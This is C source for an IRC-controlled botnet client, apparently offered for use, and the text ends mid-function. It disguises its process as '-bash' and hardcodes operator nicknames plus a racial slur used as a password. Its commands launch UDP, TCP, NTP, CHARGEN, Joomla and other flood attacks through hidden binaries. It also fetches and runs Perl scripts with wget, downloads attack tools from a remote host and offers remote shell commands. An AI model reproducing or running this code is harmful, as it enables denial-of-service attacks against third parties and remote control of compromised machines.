#define STARTUP
#undef IDENT
#define FAKENAME "-bash"
#define CHAN "#Botz"
#define KEY ""
#define PORT 6667
#define User1 "Tragedy"
#define User2 "Zeus"
#define User3 "Trag"
#define User4 "DaddyT"
#define User5 "B1NARY"
#define User6 ""
#define User7 ""
#define User8 ""
#define User9 ""
#define User10 ""
#define HSCPass "N!GGERS"
#define UDPON 1 //1 for on, 0 for off. Turns the UDP attack off.
#define SUDPON 1 //1 for on, 0 for off. Turns the SUDP attack off.
#define JOOMLAON 1 //1 for on, 0 for off. Turns the JOOMLA attack off.
#define TCPON 1 //1 for on, 0 for off. Turns the TCP attack off.
#define STDON 1 //1 for on, 0 for off. Turns the STD attack off.
#define NTPON 1 //1 for on, 0 for off. Turns the NTP attack off.
#define CHARGENON 1 //1 for on, 0 for off. Turns the CHARGEN attack off.
#define PREFIX "[NIX]"
int numservers=1;
char *servers[] = {
  "IP",
  (void*)0
};
#include <stdarg.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <strings.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/ioctl.h>


int sock,changeservers=0;
char *server, *chan, *key, *nick, *ident, *prefix, *user, disabled=1, HSCommand=1,*users1=User1,*users2=User2,*users3=User3,*users4=User4,*users5=User5,*users6=User6,*users7=User7,*users8=User8,*users9=User9,*users10=User10,*adminuser1="IRC_USER",*HSPassword=HSCPass,HSDisable=0, adminusercount=1, execfile[256],dispass[256];
unsigned int *pids;
unsigned long spoofs=0, spoofsm=0, numpids=0;
int strwildmatch(unsigned char* pattern, unsigned char* string) {
        switch((unsigned char)*pattern) {
                case '\0': return *string;
		case 'b': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
                case 'o': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
                case 't': return !(*string && !strwildmatch(pattern+1, string+1));
                default: return !((toupper(*pattern) == toupper(*string)) && !strwildmatch(pattern+1, string+1));
        }
}
int Send(int sock, char *words, ...) {
        static char textBuffer[1024];
        va_list args;
        va_start(args, words);
        vsprintf(textBuffer, words, args);
        va_end(args);
        return write(sock,textBuffer,strlen(textBuffer));
}
int mfork(char *sender) {
        unsigned int parent, *newpids, i;
        if (disabled == 1) {
                Send(sock,"NOTICE %s :Unable to comply.\n",sender);
                return 1;
        }
        parent=fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
        for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
        newpids[numpids-1]=parent;
        free(pids);
        pids=newpids;
        return parent;
}
void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
char *makestring() {
        char *tmp;
        int len=(rand()%5)+4,i;
        FILE *file;
        tmp=(char*)malloc(len+1);
        memset(tmp,0,len+1);
        char *pre;
        if ((file=fopen("/usr/dict/words","r")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
        else {
                int a=((rand()*rand())%45402)+1;
                char buf[1024];
                for (i=0;i<a;i++) fgets(buf,1024,file);
                memset(buf,0,1024);
                fgets(buf,1024,file);
                filter(buf);
                memcpy(tmp,buf,len);
                fclose(file);
        }
        return tmp;
}
void identd() {
        int sockname,sockfd,sin_size,tmpsock,i;
        struct sockaddr_in my_addr,their_addr;
        char szBuffer[1024];
        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
        my_addr.sin_family = AF_INET;
        my_addr.sin_port = htons(113);
        my_addr.sin_addr.s_addr = INADDR_ANY;
        memset(&(my_addr.sin_zero), 0, 8);
        if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1) return;
        if (listen(sockfd, 1) == -1) return;
        if (fork() == 0) return;
        sin_size = sizeof(struct sockaddr_in);
        if ((tmpsock = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)) == -1) exit(0);
        for(;;) {
                fd_set bla;
                struct timeval timee;
                FD_ZERO(&bla);
                FD_SET(tmpsock,&bla);
                timee.tv_sec=timee.tv_usec=60;
                if (select(tmpsock + 1,&bla,(fd_set*)0,(fd_set*)0,&timee) < 0) exit(0);
                if (FD_ISSET(tmpsock,&bla)) break;
        }
        i = recv(tmpsock,szBuffer,1024,0);
        if (i <= 0 || i >= 20) exit(0);
        szBuffer[i]=0;
        if (szBuffer[i-1] == '\n' || szBuffer[i-1] == '\r') szBuffer[i-1]=0;
        if (szBuffer[i-2] == '\n' || szBuffer[i-2] == '\r') szBuffer[i-2]=0;
        Send(tmpsock,"%s : USERID : UNIX : %s\n",szBuffer,ident);
        close(tmpsock);
        close(sockfd);
        exit(0);
}

void logout(int sock, char *sender, int argc, char **argv) {
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
        if (argc != 1) {
                Send(sock,"NOTICE %s :+logout <pass>\n",sender);
                Send(sock,"NOTICE %s :You are currently %s.\n",sender,disabled?"logged out.":"logged in.");
                return;
        }

        if (strlen(argv[1]) > 254) {
                Send(sock,"NOTICE %s :Password too long! > 254\n",sender);
                return;
        }

        if (disabled == 1) {
                Send(sock,"NOTICE %s :Already logged out.\n",sender);
                return;
        }

        if (strcasecmp("LOGIN_PASSWORD",argv[1]) != 0) {
                Send(sock,"NOTICE %s :Wrong password.\n",sender);
                return;
        }

        Send(sock,"NOTICE %s :Successfully logged out!\n",sender);
        disabled=1;
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}

void login(int sock, char *sender, int argc, char **argv) {
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
        if (argc != 1) {
                Send(sock,"NOTICE %s :+login <pass>\n",sender);
                Send(sock,"NOTICE %s :Current status is: %s.\n",sender,disabled?"logged out.":"logged in.");
                return;
        }

        if (disabled == 0) {
                Send(sock,"NOTICE %s :Already logged in.\n",sender);
                return;
        }

        if (strcasecmp("LOGIN_PASSWORD",argv[1]) != 0) {
                Send(sock,"NOTICE %s :Wrong password,\n",sender);
                return;
        }
        Send(sock,"NOTICE %s :Successfully logged in!\n",sender);
        disabled=0;
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}

void hsc(int sock, char *sender, int argc, char **argv) {
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
        if (argc != 1 && argc != 2) {
                Send(sock,"NOTICE %s :-hsc help\n",sender);
                return;
        }
        if(strcasecmp(adminuser1,sender) == 0){
        if(strcasecmp("enable",argv[1]) == 0){
        HSDisable = 0;
        Send(sock,"NOTICE %s :HSC has now been enabled\n",sender);
        return;
        }
        }
        if (HSDisable == 0){
        if(strcasecmp(adminuser1,sender) == 0){
        if(strcasecmp("disable",argv[1]) == 0){
        HSCommand = 1;
        HSDisable = 1;
        Send(sock,"NOTICE %s :HSC has now been disabled\n",sender);
        return;
        }
        }
        if (strcasecmp("help",argv[1]) == 0){
        Send(sock,"NOTICE %s :-hsc <pass>         = Gives you access to all HSC commands.\n",sender);sleep(2);
        Send(sock,"NOTICE %s :-hsc cancel         = Cancels access to all HSC commands.\n",sender);sleep(2);
        Send(sock,"NOTICE %s :-hsc status         = Shows the status of HSC.\n",sender);sleep(2);
        if (strcasecmp(adminuser1,sender) == 0){
        Send(sock,"NOTICE %s :-hsc change <pass>  = Changes the HSC password.\n",sender);sleep(2);
        Send(sock,"NOTICE %s :-hsc show           = Shows the HSC password.\n",sender);sleep(2);
        Send(sock,"NOTICE %s :-hsc disable        = Disables the use of HSC.\n",sender);sleep(2);
        Send(sock,"NOTICE %s :-hsc enable         = Enables the use of HSC.\n",sender);sleep(2);
        }
        return;
        }
        if (strcasecmp("status",argv[1]) == 0){
        Send(sock,"NOTICE %s :You currently have %s.\n",sender,HSCommand?"no access":"full access!");
        return;
        }
        if(strcasecmp("cancel",argv[1]) == 0){
        HSCommand = 1;
        Send(sock,"NOTICE %s :HSC has been canceled successfully.\n",sender);
        return;
        }

        if (strcasecmp(adminuser1,sender) == 0){
        if (strcasecmp("show",argv[1]) == 0){
        Send(sock,"NOTICE %s :The HSC password is %s\n",sender,HSPassword);
        return;
        }
        if (strcasecmp("change",argv[1]) == 0){
        HSPassword = strdup(argv[2]);
        Send(sock,"NOTICE %s :The HSC password is now %s\n",sender,HSPassword);
        return;
        }
        if (HSCommand == 0) {
                Send(sock,"NOTICE %s :Already granted access.\n",sender);
                return;
        }
        }
        if (strcasecmp(HSPassword,argv[1]) != 0) {
                Send(sock,"NOTICE %s :Wrong password\n",sender);
                return;
        }
        HSCommand = 0;
        Send(sock,"NOTICE %s :Access Granted. Please do >bot -hsc cancel when you are done.\n",sender);
        }
        if (HSDisable == 1){
        Send(sock,"NOTICE %s :HSC has been disabled by the admin.\n",sender);
        return;
        }
        } else {
        Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
        }
        }
void udp(int sock, char *sender, int argc, char **argv) {
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
        if (disabled == 1) {
                Send(sock,"NOTICE %s :My commands are disabled!\n",sender);
                return;
        }
        if (UDPON == 0) {
                return;
        }
        unsigned int b;
        unsigned long secs2;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
        Send(sock,"NOTICE %s :>bot +udp <IP> <PORT> <PACKETS> <SECONDS>\n",sender);
        exit(1);
    }
        Send(sock,"NOTICE %s :UDP is flooding %s on port %s with %s packets for %s seconds!\n",sender,argv[1],argv[2],argv[3],argv[4]);
        chdir("/usr/lib");
        char system_sta[256];
        snprintf(system_sta, 256, "perl .u %s %s %s %s",argv[1],argv[2],argv[3],argv[4]);
        system(system_sta);
        secs2=atol(argv[3]);
        while(1){
                if (b >= 50) {
                        if (time(NULL) >= start+secs2) break;
                                b=0;
                }
        b++;
}
Send(sock,"NOTICE %s :UDP attack finished on %s!\n",sender,argv[1]);
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}

void sudp(int sock, char *sender, int argc, char **argv) {
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
        if (disabled == 1) {
                Send(sock,"NOTICE %s :My commands are disabled!\n",sender);
                return;
        }
        if (SUDPON == 0) {
                return;
        }
        unsigned int b;
        unsigned long secs2;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
        Send(sock,"NOTICE %s :>bot +sudp <IP> <PORT> <SECONDS>\n",sender);
        exit(1);
    }
        Send(sock,"NOTICE %s :SUDP is flooding %s on port %s for %s seconds!\n",sender,argv[1],argv[2],argv[3]);
        chdir("/usr/bin");
        char system_stb[256];
        snprintf(system_stb, 256, "./.su %s %s 1 100 %s",argv[1],argv[2],argv[3]);
        system(system_stb);
        secs2=atol(argv[3]);
        while(1){
                if (b >= 50) {
                        if (time(NULL) >= start+secs2) break;
                                b=0;
                }
        b++;
}
Send(sock,"NOTICE %s :SUDP attack finished on %s!\n",sender,argv[1]);
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}
void chargen(int sock, char *sender, int argc, char **argv) {
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
        if (disabled == 1) {
                Send(sock,"NOTICE %s :My commands are disabled!\n",sender);
                return;
        }
        if (CHARGENON == 0) {
                return;
        }
        unsigned int c;
        unsigned long secs3;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
        Send(sock,"NOTICE %s :>bot +chargen <IP> <PORT> <SECONDS>\n",sender);
        exit(1);
    }
        Send(sock,"NOTICE %s :CHARGEN is flooding %s on port %s for %s seconds!\n",sender,argv[1],argv[2],argv[3]);
        chdir("/usr/lib");
        char system_stc[256];
        snprintf(system_stc, 256, "./.chargen %s %s .char.txt 100 -1 %s",argv[1],argv[2],argv[3]);
        system(system_stc);
        secs3=atol(argv[3]);
        while(1){
                if (c >= 50) {
                        if (time(NULL) >= start+secs3) break;
                                c=0;
                }
        c++;
}
Send(sock,"NOTICE %s :CHARGEN attack finished on %s!\n",sender,argv[1]);
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}
void ntp(int sock, char *sender, int argc, char **argv) {
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
        if (disabled == 1) {
                Send(sock,"NOTICE %s :My commands are disabled!\n",sender);
                return;
        }
        if (NTPON == 0) {
                return;
        }
        unsigned int d;
        unsigned long secs4;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
        Send(sock,"NOTICE %s :>bot +ntp <IP> <PORT> <SECONDS>\n",sender);
        exit(1);
    }
        Send(sock,"NOTICE %s :NTP is flooding %s on port %s for %s seconds!\n",sender,argv[1],argv[2],argv[3]);
        chdir("/usr/lib");
        char system_std[256];
        snprintf(system_std, 256, "./.n %s %s .n.txt 100 -1 %s",argv[1],argv[2],argv[3]);
        system(system_std);
        secs4=atol(argv[3]);
        while(1){
                if (d >= 50) {
                        if (time(NULL) >= start+secs4) break;
                                d=0;
                }
        d++;
}
Send(sock,"NOTICE %s :NTP attack finished on %s!\n",sender,argv[1]);
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}

void tcp(int sock, char *sender, int argc, char **argv) {
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
        if (disabled == 1) {
                Send(sock,"NOTICE %s :My commands are disabled!\n",sender);
                return;
        }
        if (TCPON == 0) {
                return;
        }
        unsigned int d;
        unsigned long secs4;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
        Send(sock,"NOTICE %s :>bot +tcp <IP> <PORT> <SECONDS>\n",sender);
        exit(1);
    }
        Send(sock,"NOTICE %s :TCP is flooding %s on port %s for %s seconds!\n",sender,argv[1],argv[2],argv[3]);
        chdir("/usr/lib");
        char system_ste[256];
        snprintf(system_ste, 256, "./.t %s %s 40 -1 %s",argv[1],argv[2],argv[3]);
        system(system_ste);
        secs4=atol(argv[3]);
        while(1){
                if (d >= 50) {
                        if (time(NULL) >= start+secs4) break;
                                d=0;
                }
        d++;
}
Send(sock,"NOTICE %s :TCP attack finished on %s!\n",sender,argv[1]);
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}

void joomla(int sock, char *sender, int argc, char **argv) {
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
        if (disabled == 1) {
                Send(sock,"NOTICE %s :My commands are disabled!\n",sender);
                return;
        }
        if (JOOMLAON == 0) {
                return;
        }
        unsigned int d;
        unsigned long secs4;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
        Send(sock,"NOTICE %s :>bot +joomla <URL> <TIME> <THREADS>\n",sender);
        exit(1);
    }
        Send(sock,"NOTICE %s :JOOMLA is flooding %s for %s with %s threads!\n",sender,argv[1],argv[2],argv[3]);
        chdir("/usr/lib");
        char system_stf[256];
        snprintf(system_stf, 256, "./.joomla03 %s .j.txt %s %s >/dev/null 2>&1",argv[1],argv[2],argv[3]);
        system(system_stf);
        secs4=atol(argv[3]);
        while(1){
                if (d >= 50) {
                        if (time(NULL) >= start+secs4) break;
                                d=0;
                }
        d++;
}
Send(sock,"NOTICE %s :JOOMLA attack finished on %s!\n",sender,argv[1]);
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}


void std(int sock, char *sender, int argc, char **argv) {
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
        if (disabled == 1) {
                Send(sock,"NOTICE %s :My commands are disabled!\n",sender);
                return;
        }
        if (STDON == 0) {
                return;
        }
        unsigned int d;
        unsigned long secs4;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
        Send(sock,"NOTICE %s :>bot +std <IP> <PORT> <SECONDS>\n",sender);
        exit(1);
    }
        Send(sock,"NOTICE %s :STD is flooding %s on port %s for %s seconds!\n",sender,argv[1],argv[2],argv[3]);
        chdir("/usr/bin");
        char system_stg[256];
        snprintf(system_stg, 256, "./.st %s %s %s",argv[1],argv[2],argv[3]);
        system(system_stg);
        secs4=atol(argv[3]);
        while(1){
                if (d >= 50) {
                        if (time(NULL) >= start+secs4) break;
                                d=0;
                }
        d++;
}
Send(sock,"NOTICE %s :STD attack finished on %s!\n",sender,argv[1]);
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}

void help(int sock, char *sender, int argc, char **argv) {
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
        if (mfork(sender) != 0) return;
                Send(sock,"NOTICE %s :If (HSC) is in the description, you will need to activate HSC to use the commands.\n",sender); sleep(2);
        Send(sock,"NOTICE %s :+udp <ip> <port> <secs>  = A UDP flood\n",sender); sleep(2);
                Send(sock,"NOTICE %s :+ntp <ip> <port> <secs> = An NTP flood\n",sender); sleep(2);
                Send(sock,"NOTICE %s :+chargen <ip> <port> <secs>  = An CHARGEN flood\n",sender); sleep(2);
                Send(sock,"NOTICE %s :+joomla <ip> <port> <secs>  = A JOOMLA flood\n",sender); sleep(2);
                Send(sock,"NOTICE %s :+std <ip> <port> <secs>  = An STD flood\n",sender); sleep(2);
                Send(sock,"NOTICE %s :+sudp <ip> <port> <secs>  = An SUDP flood\n",sender); sleep(2);
                Send(sock,"NOTICE %s :+tcp <ip> <port> <secs>  = An TCP flood\n",sender); sleep(2);
                Send(sock,"NOTICE %s :+filecheck <server with files>  = Checks for and downloads all files\n",sender); sleep(2);
        Send(sock,"NOTICE %s :+logout <pass>           = Logs the bot out\n",sender); sleep(2);
        Send(sock,"NOTICE %s :+login <pass>            = Logs the bot in\n",sender); sleep(2);
                Send(sock,"NOTICE %s :+test                    = Simple test to see if you have access.\n",sender); sleep(2);
                Send(sock,"NOTICE %s :+stop help               = Lists stop commands\n",sender); sleep(2);
                Send(sock,"NOTICE %s :-hsc help                = Lists HSC commands.\n",sender); sleep(2);
        Send(sock,"NOTICE %s :+killsec                 = (HSC)Kills the client\n",sender); sleep(2);
                Send(sock,"NOTICE %s :+exec <link> <filename>  = (HSC)Wgets a perl file and runs it.\n",sender); sleep(2);
                Send(sock,"NOTICE %s :+kill <process id>       = (HSC)Kills the client\n",sender); sleep(2);
                Send(sock,"NOTICE %s :+irc <command>           = (HSC)Sends a command to the IRC\n",sender); sleep(2);
                Send(sock,"NOTICE %s :+sh <command>            = (HSC)Sends a command to the server\n",sender); sleep(2);
                Send(sock,"NOTICE %s :+nick help               = (HSC)Shows all nick commands\n",sender); sleep(2);
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}
void exec(int sock, char *sender, int argc, char **argv) {
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
        if (HSCommand == 1) {
        Send(sock,"NOTICE %s :You have tried to enter a high security command without gaining access. Please gain access!\n",sender);
        return;
        }
        if (argc < 2) {
        Send(sock,"NOTICE %s :>bot +exec <WGET PERL SCRIPT> <FILENAME>\n",sender);
        return;
    }
        if (mfork(sender) != 0) return;
        chdir("/tmp");
    char system_sth[256];
        snprintf(system_sth, 256, "wget %s",argv[1]);
        system(system_sth);
        char system_sti[256];
        snprintf(system_sti, 256, "perl %s",argv[2]);
        system(system_sti);
        Send(sock,"NOTICE %s :Successfully downloaded %s from %s into the /tmp directory.\n",sender,argv[2],argv[1]);
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}

void filecheck(int sock, char *sender, int argc, char **argv){
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
if(argc == 0){
Send(sock, "NOTICE %s :>bot +filecheck <IP Hosting the Files>\n", sender);
Send(sock, "NOTICE %s :>bot +filecheck help for a list of script names/descriptions\n", sender);
return;
}
if (mfork(sender) != 0) return;
if (strcasecmp("help",argv[1]) == 0){
Send(sock, "NOTICE %s :The floods are:(these all need to be in /usr/bin)\n", sender); sleep(2);
Send(sock, "NOTICE %s :.n = NTP\n", sender); sleep(2);
Send(sock, "NOTICE %s :.t = TCP\n", sender); sleep(2);
Send(sock, "NOTICE %s :.su = SUDP\n", sender); sleep(2);
Send(sock, "NOTICE %s :.a = CHARGEN\n", sender); sleep(2);
Send(sock, "NOTICE %s :.l = LIST\n", sender); sleep(2);
Send(sock, "NOTICE %s :.st = STD\n", sender); sleep(2);
Send(sock, "NOTICE %s :.c = JOOMLA\n", sender); sleep(2);
Send(sock, "NOTICE %s :.u = UDP\n", sender); sleep(2);
return;
}
Send(sock, "Starting the download from %s\n", sender, argv[1]);
chdir("/usr/bin");
struct stat sb;
if (stat("/lib64", &sb) == 0 && S_ISDIR(sb.st_mode))
{
if(open(".a",O_EXCL) == -1)
{
char system_stj[256];
        snprintf(system_stj, 256, "wget %s/64/.a", argv[1]);
        system(system_stj);
        system ("chmod 777 .a");
}
if(open(".l",O_EXCL) == -1)
{
char system_stk[256];
        snprintf(system_stk, 256, "wget %s/64/.l", argv[1]);
        system(system_stk);
}
if(open(".s",O_EXCL) == -1){
char system_stl[256];
        snprintf(system_stl, 256, "wget %s/64/.s", argv[1]);
        system(system_stl);
        system ("chmod 777 .s");
}
if(open(".u",O_EXCL) == -1){
char system_stm[256];
        snprintf(system_stm, 256, "wget %s/64/.u", argv[1]);
        system(system_stm);
}
if(open(".st",O_EXCL) == -1){
char system_stn[256];
        snprintf(system_stn, 256, "wget %s/64/.st", argv[1]);
        system(system_stn);
        system ("chmod 777 .st");
}
if(open(".su",O_EXCL) == -1){
char system_sto[256];
        snprintf(system_sto, 256, "wget %s/64/.su", argv[1]);
        system(system_sto);
        system ("chmod 777 .su");
}
if(open(".c",O_EXCL) == -1){
char system_stp[256];
        snprintf(system_stp, 256, "wget %s/64/.c", argv[1]);
        system(system_stp);
        system ("chmod 777 .c");
}
if(open(".e",O_EXCL) == -1){
char system_stq[256];
        snprintf(system_stq, 256, "wget %s/64/.e", argv[1]);
        system(system_stq);
        system ("chmod 777 .e");
}
}
if (stat("/lib64", &sb) == -1){
if(open(".a",O_EXCL) == -1)
{
char system_str[256];
        snprintf(system_str, 256, "wget %s/32/.a", argv[1]);
        system(system_str);
        system ("chmod 777 .a");
}
if(open(".l",O_EXCL) == -1)
{
char system_sts[256];
        snprintf(system_sts, 256, "wget %s/32/.l", argv[1]);
        system(system_sts);
}
if(open(".s",O_EXCL) == -1){
char system_stt[256];
        snprintf(system_stt, 256, "wget %s/32/.s", argv[1]);
        system(system_stt);
        system ("chmod 777 .s");
}
if(open(".u",O_EXCL) == -1){
char system_stu[256];
        snprintf(system_stu, 256, "wget %s/32/.u", argv[1]);
        system(system_stu);
}
if(open(".st",O_EXCL) == -1){
char system_stv[256];
        snprintf(system_stv, 256, "wget %s/32/.st", argv[1]);
        system(system_stv);
        system ("chmod 777 .st");
}
if(open(".su",O_EXCL) == -1){
char system_stw[256];
        snprintf(system_stw, 256, "wget %s/32/.su", argv[1]);
        system(system_stw);
        system ("chmod 777 .su");
}
if(open(".c",O_EXCL) == -1){
char system_stx[256];
        snprintf(system_stx, 256, "wget %s/32/.c", argv[1]);
        system(system_stx);
        system ("chmod 777 .c");
}
if(open(".e",O_EXCL) == -1){
char system_sty[256];
        snprintf(system_sty, 256, "wget %s/32/.e", argv[1]);
        system(system_sty);
        system ("chmod 777 .e");
}
}
Send(sock, "NOTICE %s :All files have been uploaded from %s., or where already uploaded.\n", sender, argv[1]);
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}
void stop(int sock, char *sender, int argc, char **argv){
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
if (disabled == 1) {
                Send(sock,"NOTICE %s :My commands are disabled!\n",sender);
                return;
}
if (mfork(sender) != 0) return;
if(argc == 0){
Send(sock,"NOTICE %s :All attacks killed.\n",sender);
                                                system ("killall -9 .s");
                                                system ("killall -9 .a");
                                                system ("killall -9 .st");
                                                system ("killall -9 .su");
                                                system ("killall -9 .c");
                                                system ("killall -9 .e");
                                                return;
                }
if(strcmp(argv[1], "help" ) == 0 ){
Send(sock,"NOTICE %s :+stop              = Kills all commands and attacks.\n",sender);sleep(2);
Send(sock,"NOTICE %s :+stop udp          = Kills all UDP attacks.\n",sender);sleep(2);
Send(sock,"NOTICE %s :+stop ntp         = Kills all NTP attacks.\n",sender);sleep(2);
Send(sock,"NOTICE %s :+stop chargen          = Kills all CHARGEN attacks.\n",sender);sleep(2);
Send(sock,"NOTICE %s :+stop joomla          = Kills all JOOMLA attacks.\n",sender);sleep(2);
Send(sock,"NOTICE %s :+stop tcp        = Kills all TCP attacks.\n",sender);sleep(2);
Send(sock,"NOTICE %s :+stop std          = Kills all AMP attacks.\n",sender);sleep(2);
Send(sock,"NOTICE %s :+stop sudp         = Kills all AMP attacks.\n",sender);sleep(2);
Send(sock,"NOTICE %s :+stop commands     = Kills any running command.\n",sender);sleep(2);
return;
}
